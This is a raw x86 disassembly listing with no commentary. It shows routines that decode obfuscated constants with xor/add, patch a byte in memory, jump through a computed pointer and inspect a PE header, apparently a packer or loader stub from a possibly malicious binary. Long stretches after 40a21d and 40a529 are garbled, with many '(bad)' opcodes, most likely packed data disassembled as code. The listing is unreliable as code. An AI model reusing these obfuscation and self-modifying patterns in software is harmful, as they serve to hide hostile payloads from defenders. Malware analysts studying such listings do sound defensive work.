  409f09:	mov    eax,DWORD PTR [ebp-0x20]
  409f0c:	mov    DWORD PTR [ebp+0xc],eax
  409f0f:	mov    eax,DWORD PTR [ebp+0xc]
  409f12:	xor    eax,esi
  409f14:	add    eax,ebx
  409f16:	mov    DWORD PTR [ebp+0xc],eax
  409f19:	mov    eax,ds:0x412028
  409f1e:	mov    eax,DWORD PTR [eax]
  409f20:	mov    DWORD PTR [ebp+0xc],eax
  409f23:	mov    eax,ds:0x412230
  409f28:	mov    eax,DWORD PTR [eax]
  409f2a:	mov    DWORD PTR [ebp-0x60],eax
  409f2d:	mov    DWORD PTR [ebp+0x10],0xf89c8735
  409f34:	mov    eax,DWORD PTR [ebp+0x10]
  409f37:	xor    eax,esi
  409f39:	add    eax,ebx
  409f3b:	mov    DWORD PTR [ebp+0x10],eax
  409f3e:	mov    eax,ds:0x4121a8
  409f43:	mov    DWORD PTR [ebp+0x10],eax
  409f46:	mov    eax,DWORD PTR [ebp+0xc]
  409f49:	mov    DWORD PTR [ebp+0x10],eax
  409f4c:	mov    eax,DWORD PTR [ebp+0x10]
  409f4f:	push   0x4
  409f51:	pop    ecx
  409f52:	sub    ecx,eax
  409f54:	add    ecx,DWORD PTR [ebp-0x60]
  409f57:	mov    DWORD PTR [ebp-0x34],edi
  409f5a:	mov    DWORD PTR [ebp-0x10],ecx
  409f5d:	mov    DWORD PTR [ebp-0xc8],0xf89c8531
  409f67:	mov    eax,DWORD PTR [ebp+0x10]
  409f6a:	mov    DWORD PTR [ebp-0xc4],eax
  409f70:	mov    eax,DWORD PTR [ebp-0x10]
  409f73:	mov    DWORD PTR [ebp-0xc0],eax
  409f79:	mov    eax,DWORD PTR [ebp-0x34]
  409f7c:	xor    eax,esi
  409f7e:	add    eax,ebx
  409f80:	mov    DWORD PTR [ebp-0xbc],eax
  409f86:	lea    eax,[ebp-0x80]
  409f89:	mov    DWORD PTR [ebp-0xb8],eax
  409f8f:	mov    eax,DWORD PTR [ebp-0xc8]
  409f95:	xor    eax,esi
  409f97:	add    eax,ebx
  409f99:	mov    DWORD PTR [ebp-0xc8],eax
  409f9f:	lea    eax,[ebp-0xc8]
  409fa5:	push   eax
  409fa6:	mov    eax,DWORD PTR [ebp-0x8]
  409fa9:	xor    eax,esi
  409fab:	add    eax,ebx
  409fad:	push   eax
  409fae:	mov    eax,ds:0x4121c8
  409fb3:	push   0x41211e
  409fb8:	push   DWORD PTR [eax]
  409fba:	call   0x40b2c8
  409fbf:	and    DWORD PTR [ebp+0xc],0x0
  409fc3:	mov    eax,DWORD PTR [ebp-0x10]
  409fc6:	sub    eax,DWORD PTR [ebp+0xc]
  409fc9:	push   eax
  409fca:	mov    eax,DWORD PTR [ebp+0x10]
  409fcd:	add    eax,DWORD PTR [ebp+0xc]
  409fd0:	push   eax
  409fd1:	call   0x403861
  409fd6:	inc    DWORD PTR [ebp+0xc]
  409fd9:	cmp    DWORD PTR [ebp+0xc],0x52
  409fdd:	jb     0x409fc3
  409fe3:	mov    eax,DWORD PTR [ebp-0x8]
  409fe6:	mov    eax,ds:0x4121a8
  409feb:	mov    DWORD PTR [ebp+0x10],eax
  409fee:	mov    eax,ds:0x4122b4
  409ff3:	mov    DWORD PTR [ebp-0x68],eax
  409ff6:	mov    DWORD PTR [ebp+0xc],0xf89c8535
  409ffd:	mov    DWORD PTR [ebp-0x4],0xf89c8532
  40a004:	mov    eax,DWORD PTR [ebp+0xc]
  40a007:	xor    eax,esi
  40a009:	add    eax,ebx
  40a00b:	mov    DWORD PTR [ebp-0x7c],eax
  40a00e:	mov    DWORD PTR [ebp-0x70],0xf89cb535
  40a015:	mov    DWORD PTR [ebp-0x84],0xf89f0535
  40a01f:	mov    DWORD PTR [ebp-0x78],edi
  40a022:	mov    DWORD PTR [ebp-0x64],0xf89c85d5
  40a029:	mov    eax,DWORD PTR [ebp+0xc]
  40a02c:	xor    eax,esi
  40a02e:	add    eax,ebx
  40a030:	mov    DWORD PTR [ebp-0x38],eax
  40a033:	mov    DWORD PTR [ebp-0x48],0xf89c853e
  40a03a:	mov    BYTE PTR [ebp-0x29],0x57
  40a03e:	mov    eax,DWORD PTR [ebp+0xc]
  40a041:	xor    eax,esi
  40a043:	add    eax,ebx
  40a045:	mov    DWORD PTR [ebp-0x38],eax
  40a048:	mov    eax,DWORD PTR [ebp-0x64]
  40a04b:	xor    eax,esi
  40a04d:	add    eax,ebx
  40a04f:	push   eax
  40a050:	mov    eax,DWORD PTR [ebp-0x70]
  40a053:	xor    eax,esi
  40a055:	add    eax,ebx
  40a057:	push   eax
  40a058:	mov    eax,DWORD PTR [ebp-0x48]
  40a05b:	xor    eax,esi
  40a05d:	add    eax,ebx
  40a05f:	push   eax
  40a060:	lea    eax,[ebp-0x10c]
  40a066:	push   eax
  40a067:	push   DWORD PTR [ebp+0xc]
  40a06a:	push   DWORD PTR [ebp-0x4]
  40a06d:	call   0x40834f
  40a072:	test   eax,eax
  40a074:	je     0x40a0a5
  40a07a:	lea    eax,[ebp-0x10c]
  40a080:	push   eax
  40a081:	mov    eax,DWORD PTR [ebp-0x4]
  40a084:	xor    eax,esi
  40a086:	add    eax,ebx
  40a088:	push   eax
  40a089:	mov    eax,DWORD PTR [ebp+0x10]
  40a08c:	add    eax,0xaa
  40a091:	push   eax
  40a092:	mov    eax,DWORD PTR [ebp+0x10]
  40a095:	mov    eax,DWORD PTR [eax+0x198]
  40a09b:	push   DWORD PTR [eax]
  40a09d:	call   0x40b2c8
  40a0a2:	mov    DWORD PTR [ebp-0x24],eax
  40a0a5:	cmp    DWORD PTR [ebp-0x24],0x0
  40a0a9:	lea    edi,[ebp+0x4]
  40a0ac:	mov    DWORD PTR [ebp-0x7c],edi
  40a0af:	je     0x40a179
  40a0b5:	lea    eax,[ebp-0x38]
  40a0b8:	push   eax
  40a0b9:	mov    eax,DWORD PTR [ebp-0x78]
  40a0bc:	xor    eax,esi
  40a0be:	add    eax,ebx
  40a0c0:	push   eax
  40a0c1:	mov    eax,DWORD PTR [ebp-0x48]
  40a0c4:	xor    eax,esi
  40a0c6:	add    eax,ebx
  40a0c8:	push   eax
  40a0c9:	push   DWORD PTR [ebp-0x24]
  40a0cc:	lea    eax,[ebp-0x10c]
  40a0d2:	push   eax
  40a0d3:	push   DWORD PTR [ebp+0xc]
  40a0d6:	push   DWORD PTR [ebp-0x4]
  40a0d9:	call   0x408a84
  40a0de:	test   eax,eax
  40a0e0:	je     0x40a10e
  40a0e6:	lea    eax,[ebp-0x10c]
  40a0ec:	push   eax
  40a0ed:	mov    eax,DWORD PTR [ebp-0x4]
  40a0f0:	xor    eax,esi
  40a0f2:	add    eax,ebx
  40a0f4:	push   eax
  40a0f5:	mov    eax,DWORD PTR [ebp+0x10]
  40a0f8:	add    eax,0xee
  40a0fd:	push   eax
  40a0fe:	mov    eax,DWORD PTR [ebp+0x10]
  40a101:	mov    eax,DWORD PTR [eax+0x198]
  40a107:	push   DWORD PTR [eax]
  40a109:	call   0x40b2c8
  40a10e:	mov    ecx,DWORD PTR [ebp-0x48]
  40a111:	xor    ecx,esi
  40a113:	mov    eax,0xffcd8d63
  40a118:	sub    eax,ecx
  40a11a:	sub    eax,DWORD PTR [ebp-0x24]
  40a11d:	mov    ecx,DWORD PTR [ebp-0x68]
  40a120:	add    ecx,eax
  40a122:	mov    eax,DWORD PTR [ebp-0x24]
  40a125:	mov    DWORD PTR [eax+0x1],ecx
  40a128:	mov    al,BYTE PTR [ebp-0x29]
  40a12b:	mov    ecx,DWORD PTR [ebp-0x24]
  40a12e:	xor    al,0x48
  40a130:	sub    al,0x36
  40a132:	mov    BYTE PTR [ecx],al
  40a134:	lea    eax,[ebp-0x24]
  40a137:	inc    BYTE PTR [eax]
  40a139:	inc    eax
  40a13a:	push   eax
  40a13b:	pop    ecx
  40a13c:	dec    ecx
  40a13d:	xchg   ecx,edx
  40a13f:	dec    BYTE PTR [edx]
  40a141:	push   DWORD PTR [ebp+0x10]
  40a144:	mov    eax,ds:0x412264
  40a149:	mov    eax,DWORD PTR [eax]
  40a14b:	push   DWORD PTR [eax]
  40a14d:	lea    eax,ds:0x412280
  40a153:	push   DWORD PTR [eax]
  40a155:	lea    eax,ds:0x41202c
  40a15b:	push   DWORD PTR [eax]
  40a15d:	lea    eax,ds:0x412260
  40a163:	push   DWORD PTR [eax]
  40a165:	lea    eax,ds:0x41237c
  40a16b:	push   DWORD PTR [eax]
  40a16d:	xchg   ebx,edx
  40a16f:	inc    ebx
  40a170:	inc    ebx
  40a171:	sub    ebx,0x3
  40a174:	push   ebx
  40a175:	pop    eax
  40a176:	call   DWORD PTR [eax+0x1]
  40a179:	mov    DWORD PTR [ebp-0x6c],edi
  40a17c:	mov    eax,DWORD PTR [ebp-0x3c]
  40a17f:	mov    eax,DWORD PTR [ebp-0x18]
  40a182:	push   DWORD PTR [ebp-0x20]
  40a185:	lea    eax,[ebp-0x6c]
  40a188:	push   eax
  40a189:	call   0x406433
  40a18e:	mov    eax,ds:0x4121a8
  40a193:	push   0x4
  40a195:	add    eax,0x1cc
  40a19a:	push   eax
  40a19b:	lea    eax,[ebp-0x3c]
  40a19e:	push   eax
  40a19f:	call   0x4052e7
  40a1a4:	mov    eax,DWORD PTR [ebp-0x3c]
  40a1a7:	mov    eax,DWORD PTR [eax]
  40a1a9:	pop    edi
  40a1aa:	pop    esi
  40a1ab:	pop    ebx
  40a1ac:	leave  
  40a1ad:	ret    0xc
  40a1b0:	push   ebp
  40a1b1:	mov    ebp,esp
  40a1b3:	sub    esp,0x20
  40a1b6:	leave  
  40a1b7:	ret    0x4
  40a1ba:	push   ebp
  40a1bb:	mov    ebp,esp
  40a1bd:	push   ecx
  40a1be:	and    DWORD PTR ds:0x430656,edx
  40a1c4:	mov    DWORD PTR [ebp-0x4],0xf89c8535
  40a1cb:	mov    eax,DWORD PTR [ebp+0x8]
  40a1ce:	or     DWORD PTR ds:0x42ef30,0x430652
  40a1d8:	mov    al,BYTE PTR [eax]
  40a1da:	adc    DWORD PTR ds:0x42ef10,0x639e
  40a1e4:	add    al,0x36
  40a1e6:	sbb    DWORD PTR ds:0x4305a2,0x596d
  40a1f0:	xor    al,0x48
  40a1f2:	mov    DWORD PTR ds:0x43064e,0x7356
  40a1fc:	cmp    al,0xcb
  40a1fe:	mov    DWORD PTR ds:0x4305b2,0x64e0
  40a208:	jne    0x40a51c
  40a20e:	xor    DWORD PTR ds:0x4305b6,0x7c62
  40a218:	jmp    0x40a496
  40a21d:	lods   al,BYTE PTR ds:[esi]
  40a21e:	inc    edx
  40a21f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a220:	es jge 0x40a21c
  40a223:	lods   eax,DWORD PTR ds:[esi]
  40a224:	inc    esp
  40a225:	pop    ecx
  40a226:	push   cs
  40a227:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a228:	mov    ds:0xaf6b8588,eax
  40a22d:	rcl    esi,cl
  40a22f:	jle    0x40a2af
  40a231:	fbstp  TBYTE PTR [eax+0x7e]
  40a234:	jle    0x40a1db
  40a236:	xor    eax,0xdf61bfa8
  40a23b:	dec    ebx
  40a23c:	shr    BYTE PTR [ebx-0x7efb5c50],1
  40a242:	fldln2 
  40a244:	fwait
  40a245:	repnz (bad) 
  40a247:	ja     0x40a2c2
  40a249:	push   ds
  40a24a:	pop    ds
  40a24b:	es (bad) 
  40a24d:	pop    esp
  40a24e:	xlat   BYTE PTR ds:[ebx]
  40a250:	or     dl,al
  40a252:	sub    eax,0x951cdef4
  40a257:	outs   dx,BYTE PTR ds:[esi]
  40a258:	jecxz  0x40a261
  40a25a:	sbb    BYTE PTR [edi-0x1d971669],cl
  40a260:	imul   esi,DWORD PTR [esi+0x744011f9],0xf2f10757
  40a26a:	scas   eax,DWORD PTR es:[edi]
  40a26b:	xlat   BYTE PTR ds:[ebx]
  40a26c:	nop
  40a26d:	lea    edx,[edx+0x32c97e07]
  40a273:	mov    BYTE PTR [ecx],bh
  40a275:	fstp   QWORD PTR [edx-0x1941ed3e]
  40a27b:	xor    DWORD PTR [esi],eax
  40a27d:	or     eax,0xca2083d5
  40a282:	cwde   
  40a283:	sbb    ch,BYTE PTR [ebx+0x5cf558bf]
  40a289:	pop    ebx
  40a28a:	ds pop ds
  40a28c:	lds    ecx,FWORD PTR [edi+0x23]
  40a28f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a290:	imul   ebp,DWORD PTR [edx],0xffffffee
  40a293:	loope  0x40a309
  40a295:	repnz adc BYTE PTR [ecx+0x7d],bh
  40a299:	sahf   
  40a29a:	clc    
  40a29b:	in     eax,dx
  40a29c:	mov    ss,WORD PTR [ecx+0x2110f101]
  40a2a2:	je     0x40a230
  40a2a4:	jmp    0x8a93:0x4bcfc0f0
  40a2ab:	push   esp
  40a2ac:	sub    al,0x17
  40a2ae:	dec    esp
  40a2af:	mul    BYTE PTR [ebx+0x0]
  40a2b2:	outs   dx,DWORD PTR es:[esi]
  40a2b4:	jnp    0x40a2be
  40a2b6:	retf   0xa427
  40a2b9:	hlt    
  40a2ba:	(bad)  
  40a2bc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a2bd:	adc    edi,DWORD PTR [edi+0x5649f5c]
  40a2c3:	into   
  40a2c4:	outs   dx,DWORD PTR ds:[esi]
  40a2c5:	dec    esp
  40a2c6:	or     al,0x22
  40a2c8:	cmp    eax,0x65d8f556
  40a2cd:	jo     0x40a331
  40a2cf:	sar    BYTE PTR [ecx-0x3495acd8],1
  40a2d5:	jnp    0x40a31a
  40a2d7:	test   eax,0xbd64ad98
  40a2dc:	pushf  
  40a2dd:	dec    eax
  40a2de:	retf   
  40a2df:	jns    0x40a2b2
  40a2e1:	push   ecx
  40a2e2:	push   0x2e
  40a2e4:	imul   esi,DWORD PTR [edx+0x73],0x94dadb5d
  40a2eb:	dec    eax
  40a2ec:	sbb    BYTE PTR ds:0xff5fd794,cl
  40a2f2:	push   ds
  40a2f3:	jns    0x40a30e
  40a2f5:	popf   
  40a2f6:	mov    dl,0xd1
  40a2f8:	inc    ecx
  40a2f9:	fstp   QWORD PTR [esi+ebp*4]
  40a2fc:	cmp    eax,0x30e9132a
  40a301:	adc    al,0x91
  40a303:	inc    ebx
  40a304:	(bad)  
  40a305:	push   ss
  40a306:	mov    ah,0x19
  40a308:	sbb    ebx,DWORD PTR [edx+0x7b9a52ec]
  40a30e:	jp     0x40a311
  40a310:	in     ax,0x17
  40a313:	mov    esi,0x26c1c5c1
  40a318:	or     ebx,DWORD PTR [ecx-0x2adf33fd]
  40a31e:	pop    eax
  40a31f:	ret    0xa1be
  40a322:	stos   DWORD PTR es:[edi],eax
  40a323:	xchg   esi,eax
  40a324:	add    DWORD PTR [edi-0x34],ebp
  40a327:	jno    0x40a2f9
  40a329:	scas   eax,DWORD PTR es:[edi]
  40a32a:	ss in  eax,0x79
  40a32d:	push   edi
  40a32e:	sbb    eax,0xcd33946a
  40a333:	cmp    DWORD PTR [eax-0x6a39deaa],ebx
  40a339:	shr    bh,1
  40a33b:	sbb    eax,0x743f9878
  40a340:	pop    ds
  40a341:	stos   BYTE PTR es:[edi],al
  40a342:	adc    al,0x47
  40a344:	hlt    
  40a345:	dec    ebx
  40a346:	jnp    0x40a332
  40a348:	int    0xd
  40a34a:	bound  eax,QWORD PTR [ebp-0x4f05e95b]
  40a350:	mov    eax,ds:0xe65b998e
  40a355:	mov    ds,edi
  40a357:	jns    0x40a3c4
  40a359:	jmp    0x40a36b
  40a35b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a35c:	sbb    ecx,edi
  40a35e:	lock leave 
  40a360:	jmp    0xa760:0x6958fa38
  40a367:	lods   al,BYTE PTR ds:[esi]
  40a368:	mov    BYTE PTR [edi+0x14],dl
  40a36b:	imul   ecx,DWORD PTR [edx],0x75
  40a36e:	xor    al,0x3c
  40a370:	cdq    
  40a371:	iret   
  40a372:	mov    ch,0x12
  40a374:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a375:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a376:	mov    bh,0x1e
  40a378:	call   DWORD PTR [ecx]
  40a37a:	jne    0x40a36d
  40a37c:	pop    es
  40a37d:	mov    bh,0xd6
  40a37f:	sub    ebx,eax
  40a381:	nop
  40a382:	ja     0x40a304
  40a384:	movaps xmm4,XMMWORD PTR [ebx]
  40a387:	dec    esp
  40a388:	mov    cl,0xef
  40a38a:	push   cs
  40a38b:	shl    DWORD PTR [ebp+0x58],0x3f
  40a38f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a390:	mov    esi,0x90893262
  40a395:	lods   al,BYTE PTR ds:[esi]
  40a396:	mov    al,0xe1
  40a398:	mov    ah,0xd3
  40a39a:	call   0x16c4199d
  40a39f:	jb     0x40a3d4
  40a3a1:	scas   al,BYTE PTR es:[edi]
  40a3a2:	not    DWORD PTR [esi-0x18]
  40a3a5:	(bad)  
  40a3a6:	ret    0xcea9
  40a3a9:	xor    eax,0x54a8c80c
  40a3ae:	xor    BYTE PTR [edi+0x6a6ed2ba],dh
  40a3b4:	in     eax,dx
  40a3b5:	xchg   DWORD PTR [eax-0x54],ecx
  40a3b8:	call   0x53fc:0x6a8977f8
  40a3bf:	xchg   ebp,eax
  40a3c0:	add    esi,DWORD PTR [edi]
  40a3c2:	add    DWORD PTR [ebx-0x7f],eax
  40a3c5:	push   edx
  40a3c6:	adc    eax,0x3f0ed894
  40a3cb:	xchg   esp,eax
  40a3cc:	aad    0x18
  40a3ce:	xchg   ebx,eax
  40a3cf:	ins    BYTE PTR es:[edi],dx
  40a3d0:	mov    ds:0xfa18359b,eax
  40a3d5:	enter  0x78b6,0xbe
  40a3d9:	(bad)  
  40a3da:	ror    DWORD PTR [ebx-0x58f3cef9],cl
  40a3e0:	sub    ah,cl
  40a3e2:	cmp    al,0x7c
  40a3e4:	lahf   
  40a3e5:	mov    bl,0x3b
  40a3e7:	enter  0x878a,0x35
  40a3eb:	mov    ebp,ds
  40a3ed:	bound  ecx,QWORD PTR ds:0x5848275
  40a3f3:	inc    ecx
  40a3f4:	(bad)  
  40a3f5:	pop    ebp
  40a3f6:	xor    al,0x26
  40a3f8:	inc    esp
  40a3f9:	stc    
  40a3fa:	or     BYTE PTR es:[ebx+0x50713008],0xf3
  40a402:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a403:	stos   DWORD PTR es:[edi],eax
  40a404:	arpl   WORD PTR [ecx-0x19ad38ae],cx
  40a40a:	ss loopne 0x40a42c
  40a40d:	scas   eax,DWORD PTR es:[edi]
  40a40e:	cwde   
  40a40f:	lahf   
  40a410:	mov    edx,0xcc4d6706
  40a415:	in     eax,0xc2
  40a417:	mov    al,ds:0xca9b88bd
  40a41c:	jne    0x40a3fd
  40a41e:	mov    eax,ds:0x962bd66d
  40a423:	xor    DWORD PTR fs:[ebx-0x64],esi
  40a427:	mov    eax,0x65d16182
  40a42c:	stos   DWORD PTR es:[edi],eax
  40a42d:	cwde   
  40a42e:	jge    0x40a499
  40a430:	mov    BYTE PTR [esi-0x154a86c9],al
  40a436:	fstp   DWORD PTR [ebx-0x4b]
  40a439:	xor    esp,edx
  40a43b:	mov    dl,0xec
  40a43d:	sbb    ch,BYTE PTR es:[eax+0x32774c12]
  40a444:	stos   BYTE PTR es:[edi],al
  40a445:	jb     0x40a408
  40a447:	rcl    eax,1
  40a449:	loopne 0x40a4ca
  40a44b:	cmp    eax,0xf2255147
  40a450:	xor    DWORD PTR [esi-0x1cc7a259],0xcd6cff9a
  40a45a:	fdiv   DWORD PTR [ecx+0x27eff1f6]
  40a460:	pop    DWORD PTR [edi-0x27]
  40a463:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a464:	pop    eax
  40a465:	and    al,0xd5
  40a467:	aas    
  40a468:	mov    ?,esp
  40a46a:	mov    bl,0x76
  40a46c:	ds xchg esp,eax
  40a46e:	fidiv  DWORD PTR [esi+ebx*1]
  40a471:	or     DWORD PTR [ecx-0x330bb029],0xfffffffd
  40a478:	push   esp
  40a479:	ror    DWORD PTR [edi-0x2eeabdf],1
  40a47f:	imul   ecx,DWORD PTR [edx+eax*2+0x7efccac4],0x8c05a2e5
  40a48a:	xchg   ebp,eax
  40a48b:	mov    WORD PTR [esi+0x45],?
  40a48e:	and    al,0x8d
  40a490:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a491:	inc    ebp
  40a492:	outs   dx,BYTE PTR ds:[esi]
  40a493:	xor    eax,0x458be415
  40a498:	or     bh,al
  40a49a:	add    eax,0x430642
  40a49f:	pop    ss
  40a4a0:	add    BYTE PTR [eax],al
  40a4a2:	add    BYTE PTR [ebx+0x4306423d],al
  40a4a8:	add    BYTE PTR [eax],al
  40a4aa:	je     0x40a4d8
  40a4b0:	cmp    DWORD PTR ds:0x430642,0x24
  40a4b7:	jne    0x40a4c6
  40a4bd:	push   DWORD PTR [ebp-0x28]
  40a4c0:	call   DWORD PTR ds:0x42ebe4
  40a4c6:	mov    ecx,DWORD PTR ds:0x430642
  40a4cc:	dec    ecx
  40a4cd:	mov    DWORD PTR ds:0x430642,ecx
  40a4d3:	jmp    0x40a4a3
  40a4d8:	mov    ecx,DWORD PTR [ebp+0x8]
  40a4db:	sub    edx,0x356a
  40a4e1:	add    ecx,DWORD PTR [eax+0x3c]
  40a4e4:	and    eax,edx
  40a4e6:	mov    edx,0x7510856
  40a4eb:	mov    DWORD PTR [ebp+0x8],ecx
  40a4ee:	mov    eax,DWORD PTR [ebp-0x4]
  40a4f1:	xor    eax,edx
  40a4f3:	push   esi
  40a4f4:	mov    esi,DWORD PTR [ebp+0x8]
  40a4f7:	mov    ecx,0x32729d
  40a4fc:	add    eax,ecx
  40a4fe:	cmp    DWORD PTR [esi+0x54],eax
  40a501:	pop    esi
  40a502:	je     0x40a510
  40a508:	mov    eax,DWORD PTR [ebp+0x8]
  40a50b:	jmp    0x40a7a7
  40a510:	mov    eax,DWORD PTR [ebp-0x4]
  40a513:	xor    eax,edx
  40a515:	add    eax,ecx
  40a517:	jmp    0x40a7a7
  40a51c:	mov    eax,DWORD PTR [ebp-0x4]
  40a51f:	xor    eax,0x7510856
  40a524:	jmp    0x40a7a2
  40a529:	mov    esi,edi
  40a52b:	pop    ds
  40a52c:	outs   dx,BYTE PTR ds:[esi]
  40a52d:	adc    esp,DWORD PTR [esi+0x5b]
  40a530:	jnp    0x40a586
  40a532:	xor    eax,0xae2ba360
  40a537:	xchg   DWORD PTR [edi+0x7e7ee8b4],esp
  40a53d:	fbstp  TBYTE PTR [eax+0x7e]
  40a540:	jle    0x40a562
  40a542:	out    dx,eax
  40a543:	stos   DWORD PTR es:[edi],eax
  40a544:	jne    0x40a4f6
  40a546:	xor    ebp,eax
  40a548:	faddp  st(7),st
  40a54a:	scas   al,BYTE PTR es:[edi]
  40a54b:	and    DWORD PTR [ecx-0x3fcdd1db],esi
  40a551:	xchg   al,ch
  40a553:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a554:	test   eax,edx
  40a556:	add    ecx,ebx
  40a558:	bound  edi,QWORD PTR [esi+0x29]
  40a55b:	shr    DWORD PTR [edx+0x74],cl
  40a55e:	adc    cl,BYTE PTR [esi-0x1297fcc7]
  40a564:	xor    DWORD PTR [edx+0x6],eax
  40a567:	jl     0x40a5c9
  40a569:	bound  esp,QWORD PTR [edx-0x33]
  40a56c:	pop    ebx
  40a56d:	push   0x15
  40a56f:	popf   
  40a570:	das    
  40a571:	neg    BYTE PTR [edi+ecx*8]
  40a574:	das    
  40a575:	jle    0x40a5e0
  40a577:	adc    DWORD PTR [ebp+0x24d4578d],esp
  40a57d:	popf   
  40a57e:	xor    eax,DWORD PTR [eax-0x66]
  40a581:	push   0xfb07390d
  40a586:	fs mov ch,0xb4
  40a589:	pop    esp
  40a58a:	adc    esp,edi
  40a58c:	lea    ecx,[edx-0x3f]
  40a58f:	mov    ah,ch
  40a591:	push   esp
  40a592:	cmp    DWORD PTR ds:0x94ea0962,esp
  40a598:	orps   xmm3,xmm4
  40a59b:	xchg   ebp,eax
  40a59c:	pop    ecx
  40a59d:	shl    DWORD PTR [eax],0x93
  40a5a0:	mov    cl,0x8d
  40a5a2:	in     eax,0xaa
  40a5a4:	pop    eax
  40a5a5:	shl    BYTE PTR [edx],1
  40a5a7:	xor    BYTE PTR [ecx+0x3a52e336],ch
  40a5ad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a5ae:	(bad)  
  40a5af:	repnz repz dec ecx
  40a5b2:	test   eax,0x46531bc5
  40a5b7:	neg    ch
  40a5b9:	int    0xeb
  40a5bb:	and    al,0xdf
  40a5bd:	pop    ecx
  40a5be:	in     eax,dx
  40a5bf:	jl     0x40a5f7
  40a5c1:	jae    0x40a632
  40a5c3:	daa    
  40a5c4:	add    bl,dl
  40a5c6:	xor    ecx,DWORD PTR [edi-0x2b]
  40a5c9:	(bad)  
  40a5ca:	push   esp
  40a5cb:	add    eax,0xa9a5281
  40a5d0:	xchg   ebx,eax
  40a5d1:	out    dx,al
  40a5d2:	test   al,0xf3
  40a5d4:	mov    ch,0x43
  40a5d6:	scas   al,BYTE PTR es:[edi]
  40a5d7:	push   cs
  40a5d8:	lods   al,BYTE PTR ds:[esi]
  40a5d9:	ss daa 
  40a5db:	cmp    DWORD PTR [edx-0x61],esi
  40a5de:	lock repz mov dl,0xfa
  40a5e2:	enter  0x87a3,0xd2
  40a5e6:	lods   eax,DWORD PTR ds:[esi]
  40a5e7:	xchg   esp,eax
  40a5e8:	xor    al,0xb4
  40a5ea:	jp     0x40a638
  40a5ec:	retf   
  40a5ed:	lods   eax,DWORD PTR ds:[esi]
  40a5ee:	out    0xae,eax
  40a5f0:	pop    ss
  40a5f1:	xor    DWORD PTR [edx+0x6434e31a],eax
  40a5f7:	jecxz  0x40a657
  40a5f9:	inc    eax
  40a5fa:	stc    
  40a5fb:	xor    bl,BYTE PTR [ebx-0xd]
  40a5fe:	sbb    DWORD PTR [eax],ebx
  40a600:	pop    ss
  40a601:	aam    0x24
  40a603:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a604:	ins    DWORD PTR es:[edi],dx
  40a605:	xor    esp,0x8be7e56e
  40a60b:	gs xchg edi,eax
  40a60d:	push   eax
  40a60e:	cmp    eax,0x593232c5
  40a613:	inc    esi
  40a614:	les    edx,FWORD PTR [edx+0x7884f2c9]
  40a61a:	fbstp  TBYTE PTR [esi]
  40a61c:	xchg   esi,eax
  40a61d:	sti    
  40a61e:	jl     0x40a5f9
  40a620:	push   ecx
  40a621:	pop    ecx
  40a622:	add    bh,BYTE PTR [eax]
  40a624:	sbb    eax,0x5afd7dc0
  40a629:	je     0x40a68f
  40a62b:	xchg   bh,dh
  40a62d:	inc    eax
  40a62e:	mov    edi,0x7f2d49ea
  40a633:	fs test eax,0x97074478
  40a639:	daa    
  40a63a:	cdq    
  40a63b:	retf   0xbc3a
  40a63e:	mov    dl,0x75
  40a640:	cdq    
  40a641:	and    DWORD PTR [eax+0x52a1c421],0x6b416c36
  40a64b:	mov    dl,BYTE PTR [ebx]
  40a64d:	fcmovbe st,st(6)
  40a64f:	jl     0x40a687
  40a651:	mov    DWORD PTR [edi+0x67c9cb81],edx
  40a657:	add    ch,BYTE PTR [ecx+0x74]
  40a65a:	inc    DWORD PTR [ecx-0x36cf3bf1]
  40a660:	add    al,BYTE PTR [ebx+0x170363f4]
  40a666:	ins    BYTE PTR es:[edi],dx
  40a667:	push   ds
  40a668:	into   
  40a669:	and    BYTE PTR [eax+0xa92f116],al
  40a66f:	dec    eax
  40a670:	dec    esp
  40a671:	aad    0xb9
  40a673:	adc    edi,DWORD PTR [esi+0x49a5fa4d]
  40a679:	pop    ss
  40a67a:	lds    edx,FWORD PTR [ebx+0x4d6546c3]
  40a680:	cmc    
  40a681:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a682:	jne    0x40a669
  40a684:	xchg   edi,eax
  40a685:	pop    ebx
  40a686:	add    DWORD PTR [edi-0x14b67a3c],0xffffffa7
  40a68d:	xchg   BYTE PTR [edx+0x27],ah
  40a690:	jecxz  0x40a643
  40a692:	icebp  
  40a693:	test   DWORD PTR [ebp-0x2f],0x4d97cca8
  40a69a:	into   
  40a69b:	dec    ecx
  40a69c:	cmp    BYTE PTR [ecx+edi*8],dh
  40a69f:	imul   esi,DWORD PTR [edi+0x889f45e],0x1
  40a6a6:	ret    0x8550
  40a6a9:	push   ss
  40a6aa:	fwait
  40a6ab:	popf   
  40a6ac:	inc    ebp
  40a6ad:	mov    eax,0xe85cb66a
  40a6b2:	fs enter 0xa125,0xa2
  40a6b7:	xchg   ebx,eax
  40a6b8:	iret   
  40a6b9:	jle    0x40a66a
  40a6bb:	adc    DWORD PTR [ecx+edi*8-0x39],edx
  40a6bf:	dec    ebx
  40a6c0:	stc    
  40a6c1:	add    ah,BYTE PTR [ecx]
  40a6c3:	data16 mov ds:0x685bb832,al
  40a6c9:	sbb    esp,DWORD PTR [ecx-0xb]
  40a6cc:	push   ecx
  40a6cd:	mov    eax,0x751c2c74
  40a6d2:	(bad)  
  40a6d3:	in     al,0x2
  40a6d5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a6d6:	mov    ebx,0x7ed62e4
  40a6db:	dec    edi
  40a6dc:	ret    
  40a6dd:	xlat   BYTE PTR ds:[ebx]
  40a6de:	jg     0x40a75e
  40a6e0:	cdq    
  40a6e1:	pop    ss
  40a6e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a6e3:	retf   0x5461
